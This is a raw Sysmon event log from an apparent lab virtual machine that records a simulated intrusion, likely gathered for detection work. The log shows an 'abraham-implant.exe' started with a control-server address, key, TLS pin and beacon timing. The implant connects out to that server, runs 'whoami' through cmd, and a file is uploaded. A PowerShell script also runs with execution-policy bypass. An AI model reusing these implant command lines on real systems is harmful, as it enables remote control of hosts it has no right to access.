<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:57.9334782Z'/><EventRecordID>722</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:57.930</Data><Data Name='ProcessGuid'>{c4fe85a1-456d-6aa3-a501-000000000b00}</Data><Data Name='ProcessId'>1728</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_1xxwhhpn.1m0.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:03:57.930</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:57.2202396Z'/><EventRecordID>721</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:57.219</Data><Data Name='ProcessGuid'>{c4fe85a1-456d-6aa3-a501-000000000b00}</Data><Data Name='ProcessId'>1728</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_f0xhdq1e.0dx.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:03:57.219</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:57.0160528Z'/><EventRecordID>720</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:57.001</Data><Data Name='ProcessGuid'>{c4fe85a1-456d-6aa3-a501-000000000b00}</Data><Data Name='ProcessId'>1728</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-Command" "Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-12) } | ForEach-Object { $_.ToXml() } | Set-Content -Encoding UTF8 C:\Users\Public\abraham-https-events.xml" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-456c-6aa3-642f-3c0000000000}</Data><Data Name='LogonId'>0x3c2f64</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4CABBE9981159976C8BE76A5E,IMPHASH=2F87CE4617F593D7148B739BBF06D059</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:30.4960919Z'/><EventRecordID>719</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:30.495</Data><Data Name='ProcessGuid'>{c4fe85a1-453d-6aa3-a101-000000000b00}</Data><Data Name='ProcessId'>5952</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_ps3jnrig.tfs.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:03:30.495</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:26.0341783Z'/><EventRecordID>718</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:26.029</Data><Data Name='ProcessGuid'>{c4fe85a1-454e-6aa3-a301-000000000b00}</Data><Data Name='ProcessId'>1336</Data><Data Name='Image'>C:\Windows\System32\appidcertstorecheck.exe</Data><Data Name='FileVersion'>10.0.26100.8457 (WinBuild.160101.0800)</Data><Data Name='Description'>AppID Certificate Store Verification Task</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>AppIDCertstoreCheck.exe</Data><Data Name='CommandLine'>"C:\WINDOWS\system32\appidcertstorecheck.exe"</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\LOCAL SERVICE</Data><Data Name='LogonGuid'>{c4fe85a1-3c66-6aa3-e503-000000000000}</Data><Data Name='LogonId'>0x3e5</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=4C15950DDB11400899A7F207AF901B77,SHA256=513605BCE4C18FEE8D117ADEE1051D23AE57A6F1E735606CD5254444DADED088,IMPHASH=129D704DF0889821ED61ADCF00D784FE</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1544</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:16.3503613Z'/><EventRecordID>717</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-09-11 00:03:16.350</Data><Data Name='ProcessGuid'>{c4fe85a1-44a4-6aa3-9a01-000000000b00}</Data><Data Name='ProcessId'>1364</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='TargetFilename'>C:\Users\lab\Desktop\abraham-uploaded.exe</Data><Data Name='CreationUtcTime'>2026-09-10 23:10:56.712</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:09.4472770Z'/><EventRecordID>716</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:09.445</Data><Data Name='ProcessGuid'>{c4fe85a1-453d-6aa3-a101-000000000b00}</Data><Data Name='ProcessId'>5952</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_omgj5o25.dpy.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:03:09.445</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:09.2301653Z'/><EventRecordID>715</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:09.220</Data><Data Name='ProcessGuid'>{c4fe85a1-453d-6aa3-a101-000000000b00}</Data><Data Name='ProcessId'>5952</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-ExecutionPolicy" "Bypass" "-File" "C:\Users\Public\abraham-t003.ps1" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-453d-6aa3-3179-3b0000000000}</Data><Data Name='LogonId'>0x3b7931</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4CABBE9981159976C8BE76A5E,IMPHASH=2F87CE4617F593D7148B739BBF06D059</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:03:08.4526522Z'/><EventRecordID>714</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:03:08.450</Data><Data Name='ProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ProcessId'>3324</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\Public\abraham-t003.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:03:08.450</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:01:43.6156132Z'/><EventRecordID>713</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:01:43.613</Data><Data Name='ProcessGuid'>{c4fe85a1-44e6-6aa3-9e01-000000000b00}</Data><Data Name='ProcessId'>9172</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_pwlbjbhx.2jh.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:01:43.613</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:01:42.7206239Z'/><EventRecordID>712</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:01:42.718</Data><Data Name='ProcessGuid'>{c4fe85a1-44e6-6aa3-9e01-000000000b00}</Data><Data Name='ProcessId'>9172</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_sopysddg.4gb.ps1</Data><Data Name='CreationUtcTime'>2026-09-11 00:01:42.718</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:01:42.5165258Z'/><EventRecordID>711</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:01:42.503</Data><Data Name='ProcessGuid'>{c4fe85a1-44e6-6aa3-9e01-000000000b00}</Data><Data Name='ProcessId'>9172</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-Command" "Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-15) } | ForEach-Object { $_.ToXml() } | Set-Content -Encoding UTF8 C:\Users\Public\abraham-https-events.xml" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-44e6-6aa3-5782-3a0000000000}</Data><Data Name='LogonId'>0x3a8257</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4CABBE9981159976C8BE76A5E,IMPHASH=2F87CE4617F593D7148B739BBF06D059</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:01:14.5084993Z'/><EventRecordID>710</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:01:14.502</Data><Data Name='ProcessGuid'>{c4fe85a1-44ca-6aa3-9d01-000000000b00}</Data><Data Name='ProcessId'>4804</Data><Data Name='Image'>C:\Windows\System32\whoami.exe</Data><Data Name='FileVersion'>10.0.26100.1882 (WinBuild.160101.0800)</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami</Data><Data Name='CurrentDirectory'>C:\Windows\System32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-44a4-6aa3-5442-3a0000000000}</Data><Data Name='LogonId'>0x3a4254</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data><Data Name='ParentProcessGuid'>{c4fe85a1-44ca-6aa3-9c01-000000000b00}</Data><Data Name='ParentProcessId'>10600</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd" /C whoami</Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:01:14.4697689Z'/><EventRecordID>709</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:01:14.460</Data><Data Name='ProcessGuid'>{c4fe85a1-44ca-6aa3-9c01-000000000b00}</Data><Data Name='ProcessId'>10600</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd" /C whoami</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-44a4-6aa3-5442-3a0000000000}</Data><Data Name='LogonId'>0x3a4254</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=CE396564392FAFAAD5C07A5E2DADE4E6,SHA256=97AC98B1A92C286054CCE55239CFCCDFC23A5517BD07FE693072C9CA96C7DABB,IMPHASH=010B165E4C37F484601D3DBD700C9423</Data><Data Name='ParentProcessGuid'>{c4fe85a1-44a4-6aa3-9a01-000000000b00}</Data><Data Name='ParentProcessId'>1364</Data><Data Name='ParentImage'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='ParentCommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--tls-pin" "1f07b34a2aa8cca70320df156a72334dc59dc0cf3f9e2f5e2c277a5e25f4140b" "--sleep" "3" "--jitter" "0.25" </Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:00:38.8164150Z'/><EventRecordID>708</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-11 00:00:36.550</Data><Data Name='ProcessGuid'>{c4fe85a1-44a4-6aa3-9a01-000000000b00}</Data><Data Name='ProcessId'>1364</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>65005</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:00:36.5127582Z'/><EventRecordID>707</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:00:36.509</Data><Data Name='ProcessGuid'>{c4fe85a1-44a4-6aa3-9a01-000000000b00}</Data><Data Name='ProcessId'>1364</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--tls-pin" "1f07b34a2aa8cca70320df156a72334dc59dc0cf3f9e2f5e2c277a5e25f4140b" "--sleep" "3" "--jitter" "0.25" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-44a4-6aa3-5442-3a0000000000}</Data><Data Name='LogonId'>0x3a4254</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=FE52297BCDDDC1E0732C4B27234AEBB8,SHA256=1005E84972237B0D323A35CE70C0CF2B6CCA0A4239BD653A26370659A85E9B05,IMPHASH=9B8C617A38FA6144D4009B423E48D71E</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-11T00:00:07.3944531Z'/><EventRecordID>706</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-11 00:00:07.392</Data><Data Name='ProcessGuid'>{c4fe85a1-4487-6aa3-9901-000000000b00}</Data><Data Name='ProcessId'>2368</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='FileVersion'>10.0.26100.8328 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskhostw.exe</Data><Data Name='CommandLine'>taskhostw.exe</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-3c65-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=9E9370331B9D14ABBA21091FFFCD1D1E,SHA256=EA8D441DF237FB3D3B7A27A95FDE186E19C94D58A618F5C29ED5FC13CB155E96,IMPHASH=2196268E7A2880E3ADC74481297D0C4B</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1544</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:26.2593484Z'/><EventRecordID>705</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:26.258</Data><Data Name='ProcessGuid'>{c4fe85a1-445e-6aa3-9601-000000000b00}</Data><Data Name='ProcessId'>8632</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
